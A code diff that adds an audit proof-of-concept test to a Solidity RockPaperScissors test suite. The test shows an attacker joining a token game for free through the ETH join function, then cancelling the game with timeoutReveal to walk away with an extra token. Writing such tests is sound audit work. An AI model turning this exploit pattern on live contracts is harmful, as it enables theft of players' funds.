@@ -872,4 +872,59 @@ contract RockPaperScissorsTest is Test {
     receive() external payable {
         // Allow the test contract to receive ETH
     }
+
+    // The following tests are for auditing proof of concept purposes
+
+    address public playerC = makeAddr("playerC");
+    address public playerD = makeAddr("playerD");
+    uint256 testGameId;
+
+    // This test shows that a player is able to join a token game for free using the joinGameWithEth function
+    // This allows them to join games for free without risking any tokens
+    function testJoinGameWithTokenUsingEth() public {
+        // Set up 2 new players, we will be using playerD's account as the attacker
+        vm.prank(address(game));
+        token.mint(playerC, 10);
+
+        vm.prank(address(game));
+        token.mint(playerD, 10);
+        vm.stopPrank();
+
+        // First create a game with token
+        vm.startPrank(playerC);
+        token.approve(address(game), 1);
+        testGameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
+        vm.stopPrank();
+
+        // Now join the same game using joinGameWithEth
+        vm.startPrank(playerD);
+        game.joinGameWithEth(testGameId);
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(playerC), 9);
+        // verify that player D did not transfer tokens    
+        assertEq(token.balanceOf(playerD), 10);
+
+        // Verify game state, ensure that player D is in the game
+        (address storedPlayerC, address storedPlayerD,,,,,,,,,,,,,, RockPaperScissors.GameState state) =
+            game.games(testGameId);
+
+        assertEq(storedPlayerC, playerC);
+        assertEq(storedPlayerD, playerD);
+        assertEq(uint256(state), uint256(RockPaperScissors.GameState.Created));
+
+        // Commit a move for player D
+        bytes32 saltD = keccak256(abi.encodePacked("salt for player D"));
+        bytes32 commitD = keccak256(abi.encodePacked(uint8(RockPaperScissors.Move.Rock), saltD));
+
+        vm.startPrank(playerD);
+        game.commitMove(testGameId, commitD);
+        // Call timeoutReveal immediately after commiting to get a the game cancelled
+        game.timeoutReveal(testGameId);
+        vm.stopPrank();
+
+        // Verify balances, showing that playerD was able to gain tokens
+        assertEq(token.balanceOf(playerC), 10);
+        assertEq(token.balanceOf(playerD), 11);
+    }
 }
